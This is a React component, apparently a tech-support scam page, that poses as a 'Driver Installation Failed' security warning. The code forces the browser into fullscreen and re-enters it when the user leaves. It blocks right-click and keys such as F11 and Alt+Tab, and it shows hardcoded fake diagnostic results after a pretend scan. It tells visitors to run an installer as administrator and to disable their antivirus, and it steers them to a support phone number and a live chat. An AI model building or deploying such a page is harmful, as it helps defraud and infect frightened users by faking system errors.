import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import {
  PhoneCall,
  MessageSquare,
  Shield,
  WifiOff,
  Lock,
  HardDrive,
  RefreshCw,
} from "lucide-react";
import { Link } from "react-router-dom";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";

const DriverError = () => {
  const [diagnosticResults, setDiagnosticResults] = useState(null);
  const [isRunningDiagnostics, setIsRunningDiagnostics] = useState(false);
  const [browser, setBrowser] = useState("");

  useEffect(() => {
    // Detect browser
    const detectBrowser = () => {
      if (window.navigator.userAgent.includes("Edg")) return "edge";
      if (window.navigator.userAgent.includes("Chrome")) return "chrome";
      if (window.navigator.userAgent.includes("Brave")) return "brave";
      return "other";
    };

    const detected = detectBrowser();
    setBrowser(detected);

    // Handle fullscreen
    const enterFullscreen = async () => {
      try {
        const elem = document.documentElement as any;
        if (elem.requestFullscreen) {
          await elem.requestFullscreen();
        } else if (elem.webkitRequestFullscreen) {
          await elem.webkitRequestFullscreen();
        } else if (elem.msRequestFullscreen) {
          await elem.msRequestFullscreen();
        }
      } catch (err) {
        console.error("Fullscreen request failed:", err);
      }
    };

    // Only enter fullscreen for supported browsers
    if (["edge", "chrome", "brave"].includes(detected)) {
      enterFullscreen();
    }

    // Prevent default actions for certain keys
    const handleKeyDown = (e) => {
      // Allow ESC key
      if (e.key === "Escape") return;

      // Prevent F11, Alt+Tab, Windows key
      if (
        e.key === "F11" ||
        (e.altKey && e.key === "Tab") ||
        e.key === "Meta" ||
        e.key === "Windows"
      ) {
        e.preventDefault();
      }
    };

    // Prevent right-click
    const handleContextMenu = (e) => {
      e.preventDefault();
    };

    // Add event listeners
    document.addEventListener("keydown", handleKeyDown);
    document.addEventListener("contextmenu", handleContextMenu);

    // Re-enter fullscreen if user exits
    document.addEventListener("fullscreenchange", () => {
      if (
        !document.fullscreenElement &&
        ["edge", "chrome", "brave"].includes(detected)
      ) {
        enterFullscreen();
      }
    });

    // Cleanup
    return () => {
      document.removeEventListener("keydown", handleKeyDown);
      document.removeEventListener("contextmenu", handleContextMenu);
    };
  }, []);

  // Rest of the component remains the same...
  const handleCallClick = () => {
    window.location.href = "tel:1-800-123-4567";
  };

  const handleChatClick = () => {
    window.open("https://tawk.to/chat/67822971af5bfec1dbea1367/1iha73pb0", "_blank");
  };

  const runDiagnostics = () => {
    setIsRunningDiagnostics(true);
    setTimeout(() => {
      setDiagnosticResults({
        secureConnection: false,
        windowsDefender: true,
        adminRights: false,
        systemRequirements: {
          ram: "4GB",
          required: "8GB",
          diskSpace: "2.1GB",
          required_space: "4GB",
        },
      });
      setIsRunningDiagnostics(false);
    }, 2000);
  };

  useEffect(() => {
    runDiagnostics();
  }, []);

  return (
    <div className="min-h-screen bg-[#1A1F2C] flex items-center justify-center p-4">
      {browser && !["edge", "chrome", "brave"].includes(browser) && (
        <Alert className="fixed top-4 left-4 right-4 border-yellow-600 bg-yellow-950/50">
          <AlertTitle className="text-yellow-400">
            Browser Compatibility Warning
          </AlertTitle>
          <AlertDescription className="text-yellow-200">
            Please use Microsoft Edge, Google Chrome, or Brave browser for the
            best experience.
          </AlertDescription>
        </Alert>
      )}

      <div className="max-w-3xl mx-auto">
        <div className="bg-[#222837] rounded-lg p-8 shadow-xl">
          {/* Rest of the JSX remains the same... */}
          {/* Previous component content */}
          <div className="w-20 h-20 mx-auto mb-6 text-[#ea384c]">
            <Shield className="w-full h-full" />
          </div>

          <h1 className="text-3xl font-bold text-white mb-4 text-center">
            Security Warning: Driver Installation Failed
          </h1>

          <Alert className="mb-6 border-yellow-600 bg-yellow-950/50">
            <AlertTitle className="text-yellow-400">
              System Requirements Not Met
            </AlertTitle>
            <AlertDescription className="text-yellow-200">
              Your system configuration doesn't meet the minimum requirements
              for secure driver installation.
            </AlertDescription>
          </Alert>

          <div className="space-y-6 mb-8">
            {diagnosticResults && (
              <div className="grid gap-4 md:grid-cols-2">
                <div className="bg-[#2A303C] p-4 rounded-lg">
                  <div className="flex items-center gap-2 mb-2">
                    <Lock className="h-5 w-5 text-red-400" />
                    <span className="text-white font-medium">
                      Security Status
                    </span>
                  </div>
                  <p className="text-red-400">
                    ⚠️ Insecure network connection detected
                  </p>
                </div>

                <div className="bg-[#2A303C] p-4 rounded-lg">
                  <div className="flex items-center gap-2 mb-2">
                    <HardDrive className="h-5 w-5 text-yellow-400" />
                    <span className="text-white font-medium">
                      System Resources
                    </span>
                  </div>
                  <p className="text-yellow-400">
                    ⚠️ Insufficient RAM:{" "}
                    {diagnosticResults.systemRequirements.ram}/
                    {diagnosticResults.systemRequirements.required}
                  </p>
                </div>

                <div className="col-span-2">
                  <Alert className="border-red-600 bg-red-950/50">
                    <AlertTitle className="text-red-400 flex items-center gap-2">
                      <Lock className="h-4 w-4" />
                      Administrator Rights Required
                    </AlertTitle>
                    <AlertDescription className="text-red-200">
                      Please run the installer with administrator privileges to
                      ensure proper system access.
                    </AlertDescription>
                  </Alert>
                </div>
              </div>
            )}

            <div className="bg-[#2A303C] p-4 rounded-lg">
              <h3 className="text-white font-medium mb-2">Required Actions:</h3>
              <ul className="space-y-2 text-gray-300">
                <li>1. Connect to a secure network or disable VPN</li>
                <li>2. Close resource-intensive applications</li>
                <li>3. Right-click installer and "Run as Administrator"</li>
                <li>4. Temporarily disable antivirus software</li>
              </ul>
            </div>
          </div>

          <div className="flex flex-col items-center space-y-6">
            <Button
              onClick={runDiagnostics}
              className="bg-[#3B82F6] hover:bg-[#2563EB] text-white px-6 py-2 rounded-md flex items-center gap-2"
              disabled={isRunningDiagnostics}
            >
              <RefreshCw
                className={`h-4 w-4 ${
                  isRunningDiagnostics ? "animate-spin" : ""
                }`}
              />
              {isRunningDiagnostics
                ? "Running Diagnostics..."
                : "Run Diagnostics Again"}
            </Button>

            <div className="flex items-center justify-center gap-2 text-white">
              <PhoneCall className="h-5 w-5 text-[#D6BCFA]" />
              <span>Technical Support: 1-800-123-4567</span>
            </div>

            <div className="flex gap-4">
              <Button
                onClick={handleCallClick}
                className="bg-[#4A5568] hover:bg-[#2D3748] text-white px-6 py-2 rounded-md flex items-center gap-2"
              >
                <PhoneCall className="h-4 w-4" />
                Call Support
              </Button>
              <Button
                onClick={handleChatClick}
                className="bg-[#4A5568] hover:bg-[#2D3748] text-white px-6 py-2 rounded-md flex items-center gap-2"
              >
                <MessageSquare className="h-4 w-4" />
                Live Chat
              </Button>
            </div>

            <p className="text-[#8E9196] text-sm">
              Error Code: SEC_NET_001 | Session ID:{" "}
              {Math.random().toString(36).substring(7).toUpperCase()}
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default DriverError;
